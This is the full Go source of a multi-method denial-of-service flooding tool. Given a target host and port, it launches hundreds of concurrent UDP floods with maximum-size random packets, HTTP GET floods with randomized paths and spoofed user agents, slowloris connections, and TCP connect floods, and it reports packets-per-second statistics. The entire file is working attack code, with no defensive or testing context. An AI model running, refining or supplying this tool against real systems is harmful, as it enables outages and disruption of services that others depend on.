package main

import (
	"crypto/rand"
	"crypto/tls"
	"flag"
	"fmt"
	"math/big"
	"net"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

var (
	target   string
	port     int
	method   string
	duration int
	threads  int
	packets  uint64
	bytes    uint64
)

func main() {
	flag.StringVar(&target, "target", "", "target IP or domain")
	flag.IntVar(&port, "port", 80, "target port")
	flag.StringVar(&method, "method", "udp", "udp|http|slowloris|tcp|mixed")
	flag.IntVar(&duration, "duration", 60, "duration seconds")
	flag.IntVar(&threads, "threads", 500, "concurrent threads")
	flag.Parse()

	if target == "" {
		fmt.Fprintln(os.Stderr, "target required")
		os.Exit(1)
	}

	if net.ParseIP(target) == nil {
		ips, err := net.LookupIP(target)
		if err != nil || len(ips) == 0 {
			fmt.Fprintf(os.Stderr, "cannot resolve %s\n", target)
			os.Exit(1)
		}
		target = ips[0].String()
	}

	fmt.Printf("[engine] target=%s:%d method=%s dur=%ds threads=%d\n",
		target, port, method, duration, threads)

	deadline := time.Now().Add(time.Duration(duration) * time.Second)
	var wg sync.WaitGroup

	switch method {
	case "udp":
		for i := 0; i < threads; i++ {
			wg.Add(1)
			go udpFlood(deadline, &wg)
		}
	case "http":
		for i := 0; i < threads; i++ {
			wg.Add(1)
			go httpFlood(deadline, &wg)
		}
	case "slowloris":
		for i := 0; i < threads; i++ {
			wg.Add(1)
			go slowloris(deadline, &wg)
		}
	case "tcp":
		for i := 0; i < threads; i++ {
			wg.Add(1)
			go tcpFlood(deadline, &wg)
		}
	case "mixed":
		n := threads / 4
		if n < 1 {
			n = 1
		}
		for i := 0; i < n; i++ {
			wg.Add(4)
			go udpFlood(deadline, &wg)
			go httpFlood(deadline, &wg)
			go tcpFlood(deadline, &wg)
			go slowloris(deadline, &wg)
		}
	default:
		fmt.Fprintln(os.Stderr, "unknown method")
		os.Exit(1)
	}

	go func() {
		t := time.NewTicker(time.Second)
		defer t.Stop()
		var lp, lb uint64
		for range t.C {
			p := atomic.LoadUint64(&packets)
			b := atomic.LoadUint64(&bytes)
			fmt.Printf("[stats] pps=%d bps=%d total_p=%d total_b=%d\n",
				p-lp, b-lb, p, b)
			lp, lb = p, b
			if time.Now().After(deadline) {
				return
			}
		}
	}()

	wg.Wait()
	time.Sleep(time.Second)
	fmt.Printf("[engine] done. total=%d bytes=%d\n",
		atomic.LoadUint64(&packets), atomic.LoadUint64(&bytes))
}

func udpFlood(deadline time.Time, wg *sync.WaitGroup) {
	defer wg.Done()
	conn, err := net.Dial("udp", fmt.Sprintf("%s:%d", target, port))
	if err != nil {
		return
	}
	defer conn.Close()

	buf := make([]byte, 65507)
	for time.Now().Before(deadline) {
		rand.Read(buf)
		n, err := conn.Write(buf)
		if err == nil {
			atomic.AddUint64(&packets, 1)
			atomic.AddUint64(&bytes, uint64(n))
		}
	}
}

var httpClient = &http.Client{
	Timeout: 5 * time.Second,
	Transport: &http.Transport{
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
		MaxIdleConns:        0,
		MaxIdleConnsPerHost: 0,
		DisableKeepAlives:   true,
	},
}

var uas = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
	"curl/7.88.1",
	"python-requests/2.31.0",
}

func randInt(max int) int {
	if max <= 0 {
		return 0
	}
	n, err := rand.Int(rand.Reader, big.NewInt(int64(max)))
	if err != nil {
		return 0
	}
	return int(n.Int64())
}

func httpFlood(deadline time.Time, wg *sync.WaitGroup) {
	defer wg.Done()
	scheme := "http"
	if port == 443 {
		scheme = "https"
	}
	base := fmt.Sprintf("%s://%s:%d", scheme, target, port)
	paths := []string{"/", "/index.html", "/api", "/search?q=", "/admin"}

	for time.Now().Before(deadline) {
		p := paths[randInt(len(paths))]
		u := base + p + strconv.Itoa(randInt(999999))
		req, err := http.NewRequest("GET", u, nil)
		if err != nil {
			continue
		}
		req.Header.Set("User-Agent", uas[randInt(len(uas))])
		req.Header.Set("Accept", "*/*")
		resp, err := httpClient.Do(req)
		if err == nil {
			atomic.AddUint64(&packets, 1)
			atomic.AddUint64(&bytes, 1500)
			resp.Body.Close()
		}
	}
}

func slowloris(deadline time.Time, wg *sync.WaitGroup) {
	defer wg.Done()
	for time.Now().Before(deadline) {
		conn, err := net.DialTimeout("tcp",
			fmt.Sprintf("%s:%d", target, port), 5*time.Second)
		if err != nil {
			time.Sleep(100 * time.Millisecond)
			continue
		}
		fmt.Fprintf(conn, "GET /%d HTTP/1.1\r\n", randInt(999999))
		fmt.Fprintf(conn, "Host: %s\r\n", target)
		fmt.Fprintf(conn, "User-Agent: %s\r\n", uas[randInt(len(uas))])
		fmt.Fprintf(conn, "Accept: */*\r\n")
		atomic.AddUint64(&packets, 1)

		for time.Now().Before(deadline) {
			time.Sleep(2 * time.Second)
			if _, err := fmt.Fprintf(conn, "X-Keep: %d\r\n",
				randInt(999999)); err != nil {
				break
			}
			atomic.AddUint64(&packets, 1)
		}
		conn.Close()
	}
}

func tcpFlood(deadline time.Time, wg *sync.WaitGroup) {
	defer wg.Done()
	for time.Now().Before(deadline) {
		c, err := net.DialTimeout("tcp",
			fmt.Sprintf("%s:%d", target, port), 500*time.Millisecond)
		if err == nil {
			c.Close()
		}
		atomic.AddUint64(&packets, 1)
	}
}

var _ = strings.Split